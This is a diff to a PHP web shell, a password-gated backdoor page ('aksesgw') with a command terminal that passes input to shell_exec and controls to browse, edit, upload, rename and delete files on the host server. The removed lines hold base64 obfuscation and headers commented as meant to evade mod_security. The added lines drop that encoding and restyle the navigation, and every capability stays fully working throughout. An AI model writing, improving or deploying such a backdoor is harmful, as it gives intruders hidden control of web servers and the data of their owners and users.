@@ -2,12 +2,6 @@
 @ini_set('display_errors', 0);
 @error_reporting(0);
 
-// Set headers to bypass LiteSpeed mod_security
-header('X-Powered-By: PHP/7.4'); // Mimic a common PHP version
-header('X-Content-Type-Options: nosniff'); // Prevent MIME-type sniffing
-header('X-Frame-Options: DENY'); // Prevent clickjacking
-header('Cache-Control: no-cache, no-store, must-revalidate'); // Avoid caching
-
 $auth = 'aksesgw';
 
 // === AUTH PROTECTION ===
@@ -19,7 +13,7 @@ if (!isset($_GET['auth']) || $_GET['auth'] !== $auth) {
 session_start();
 
 // === CURRENT DIRECTORY HANDLER ===
-$cwd = isset($_GET['path']) && is_dir(base64_decode($_GET['path'])) ? base64_decode($_GET['path']) : getcwd();
+$cwd = isset($_GET['path']) && is_dir($_GET['path']) ? $_GET['path'] : getcwd();
 @chdir($cwd);
 $cwd = getcwd();
 
@@ -46,7 +40,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // Save File
     if (isset($_POST['savefile'], $_POST['filepath'], $_POST['filecontent'])) {
-        @file_put_contents(base64_decode($_POST['filepath']), $_POST['filecontent']);
+        @file_put_contents($_POST['filepath'], $_POST['filecontent']);
     }
 
     // Rename
@@ -58,25 +52,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // Run Command (Obfuscated)
+    // Run Command
     if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
-        $cmd = base64_decode($_POST['cmd']);
-        $_SESSION['last_cmd'] = base64_encode(shell_exec($cmd . " 2>&1"));
+        $_SESSION['last_cmd'] = shell_exec($_POST['cmd'] . " 2>&1");
     }
 
-    header("Location: ?auth=$auth&path=" . urlencode(base64_encode($cwd)));
+    header("Location: ?auth=$auth&path=" . urlencode($cwd));
     exit;
 }
 
 // === DELETE ===
 if (isset($_GET['delete'])) {
-    $target = base64_decode($_GET['delete']);
+    $target = $_GET['delete'];
     if (is_dir($target)) {
         @rmdir($target);
     } elseif (is_file($target)) {
         @unlink($target);
     }
-    header("Location: ?auth=$auth&path=" . urlencode(base64_encode($cwd)));
+    header("Location: ?auth=$auth&path=" . urlencode($cwd));
     exit;
 }
 
@@ -92,22 +85,23 @@ input[type=text]{padding:4px}
 textarea{width:100%;height:300px}
 .btn{padding:5px 10px;margin:3px;cursor:pointer}
 pre{background:#000;color:#0f0;padding:10px;overflow:auto}
-.breadcrumb {margin-bottom: 20px;}
-.breadcrumb a {text-decoration: none; color: #007bff; margin-right: 5px;}
-.breadcrumb a:hover {text-decoration: underline;}
+.breadcrumb {margin-bottom:20px;}
+.breadcrumb a {text-decoration:none;color:#007bff;}
+.breadcrumb a:hover {text-decoration:underline;}
+.breadcrumb span {color:#555;}
 </style></head><body>";
 
 echo "<h2>📁 Current Path: " . h($cwd) . "</h2>";
 
 // === FOLDER NAVIGATION ===
 echo "<div class='breadcrumb'>";
-$pathParts = explode(DIRECTORY_SEPARATOR, $cwd);
-$tempPath = '';
-echo "<a href='?auth=$auth&path=" . urlencode(base64_encode(DIRECTORY_SEPARATOR)) . "'>/</a>";
-foreach ($pathParts as $part) {
+$path_parts = explode(DIRECTORY_SEPARATOR, $cwd);
+$temp_path = '';
+echo "<a href='?auth=$auth&path=" . urlencode('/') . "'>Root</a>";
+foreach ($path_parts as $part) {
     if (!empty($part)) {
-        $tempPath .= DIRECTORY_SEPARATOR . $part;
-        echo " / <a href='?auth=$auth&path=" . urlencode(base64_encode($tempPath)) . "'>" . h($part) . "</a>";
+        $temp_path .= DIRECTORY_SEPARATOR . $part;
+        echo " <span>></span> <a href='?auth=$auth&path=" . urlencode($temp_path) . "'>" . h($part) . "</a>";
     }
 }
 echo "</div>";
@@ -115,12 +109,11 @@ echo "</div>";
 // === TERMINAL ===
 echo "<h3>💻 Terminal</h3>
 <form method='POST'>
-<input type='text' name='cmd' placeholder='Command...' style='width:80%' />
-<input type='hidden' name='encoded' value='1' />
+<input type='text' name='cmd' placeholder='Command...' style='width:80%'/>
 <input type='submit' value='Run' class='btn' />
 </form>";
 if (isset($_SESSION['last_cmd'])) {
-    echo "<pre>" . h(base64_decode($_SESSION['last_cmd'])) . "</pre>";
+    echo "<pre>" . h($_SESSION['last_cmd']) . "</pre>";
 }
 
 // === UPLOAD & CREATE ===
@@ -150,13 +143,13 @@ foreach (@scandir($cwd) as $f) {
 
     echo "<tr>";
     echo "<td>" . ($is_dir ? "📁 " : "📄 ") .
-         "<a href='?auth=$auth&path=" . urlencode(base64_encode(realpath($full))) . "'>" . h($f) . "</a></td>";
+         "<a href='?auth=$auth&path=" . urlencode(realpath($full)) . "'>" . h($f) . "</a></td>";
     echo "<td>$size</td><td>";
 
     // Delete
     echo "<form method='GET' class='inline'>
             <input type='hidden' name='auth' value='$auth'>
-            <input type='hidden' name='delete' value='" . h(base64_encode($full)) . "'>
+            <input type='hidden' name='delete' value='" . h($full) . "'>
             <input type='submit' value='🗑️ Delete' class='btn'>
           </form> ";
 
@@ -164,7 +157,7 @@ foreach (@scandir($cwd) as $f) {
     if (!$is_dir) {
         echo "<form method='GET' class='inline'>
                 <input type='hidden' name='auth' value='$auth'>
-                <input type='hidden' name='edit' value='" . h(base64_encode($full)) . "'>
+                <input type='hidden' name='edit' value='" . h($full) . "'>
                 <input type='submit' value='✏️ Edit' class='btn'>
               </form> ";
     }
@@ -181,11 +174,11 @@ foreach (@scandir($cwd) as $f) {
 echo "</table>";
 
 // === EDIT FILE ===
-if (isset($_GET['edit']) && is_file(base64_decode($_GET['edit']))) {
-    $editf = base64_decode($_GET['edit']);
+if (isset($_GET['edit']) && is_file($_GET['edit'])) {
+    $editf = $_GET['edit'];
     echo "<h2>Edit: " . h($editf) . "</h2>
     <form method='POST'>
-    <input type='hidden' name='filepath' value='" . h(base64_encode($editf)) . "' />
+    <input type='hidden' name='filepath' value='" . h($editf) . "' />
     <textarea name='filecontent'>" . h(file_get_contents($editf)) . "</textarea><br/>
     <input type='submit' name='savefile' value='💾 Save' class='btn' />
     </form>";
